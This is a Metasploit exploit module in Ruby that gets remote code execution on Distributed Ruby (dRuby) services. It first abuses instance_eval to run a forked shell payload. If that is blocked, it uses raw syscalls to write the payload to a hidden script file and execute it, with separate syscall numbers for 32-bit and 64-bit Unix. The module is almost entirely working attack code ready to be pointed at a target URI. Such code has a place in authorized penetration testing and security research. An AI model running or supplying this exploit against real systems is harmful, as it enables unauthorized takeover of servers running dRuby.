##
# This module requires Metasploit: http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'
require 'drb/drb'

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  def initialize(info = {})
    super(update_info(info,
      'Name'           => 'Distributed Ruby Send instance_eval/syscall Code Execution',
      'Description'    => %q{
        This module exploits remote code execution vulnerabilities in dRuby
      },
      'Author'         => [ 'joernchen <joernchen[at]phenoelit.de>' ], #(Phenoelit)
      'License'        => MSF_LICENSE,
      'References'     =>
        [
          [ 'URL', 'http://www.ruby-doc.org/stdlib-1.9.3/libdoc/drb/rdoc/DRb.html' ],
        ],
      'Privileged'     => false,
      'Payload'        =>
        {
          'DisableNops' => true,
          'Compat'      =>
            {
              'PayloadType' => 'cmd',
            },
          'Space'       => 32768,
        },
      'Platform'       => 'unix',
      'Arch'           => ARCH_CMD,
      'Targets'        => [[ 'Automatic', { }]],
      'DisclosureDate' => 'Mar 23 2011',
      'DefaultTarget' => 0))


      register_options(
        [
          OptString.new('URI', [true, "The dRuby URI of the target host (druby://host:port)", ""]),
        ], self.class)
  end

  def exploit
    serveruri = datastore['URI']
    DRb.start_service
    p = DRbObject.new_with_uri(serveruri)
    class << p
      undef :send
    end
    begin
      print_status('trying to exploit instance_eval')
      p.send(:instance_eval,"Kernel.fork { `#{payload.encoded}` }")

    rescue SecurityError => e
      print_status('instance eval failed, trying to exploit syscall')
      filename = "." + Rex::Text.rand_text_alphanumeric(16)
      begin

        # syscall to decide wether it's 64 or 32 bit:
        # it's getpid on 32bit which will succeed, and writev on 64bit
        # which will fail due to missing args
        j = p.send(:syscall,20)
        # syscall open
        i =  p.send(:syscall,8,filename,0700)
        # syscall write
        p.send(:syscall,4,i,"#!/bin/sh\n" << payload.encoded,payload.encoded.length + 10)
        # syscall close
        p.send(:syscall,6,i)
        # syscall fork
        p.send(:syscall,2)
        # syscall execve
        p.send(:syscall,11,filename,0,0)

      # not vulnerable
      rescue SecurityError => e

        print_status('target is not vulnerable')

      # likely 64bit system
      rescue => e
        # syscall creat
        i = p.send(:syscall,85,filename,0700)
        # syscall write
        p.send(:syscall,1,i,"#!/bin/sh\n" << payload.encoded,payload.encoded.length + 10)
        # syscall close
        p.send(:syscall,3,i)
        # syscall fork
        p.send(:syscall,57)
        # syscall execve
        p.send(:syscall,59,filename,0,0)
      end
    end
    print_status("payload executed from file #{filename}") unless filename.nil?
    print_status("make sure to remove that file") unless filename.nil?
    handler(nil)
  end
end
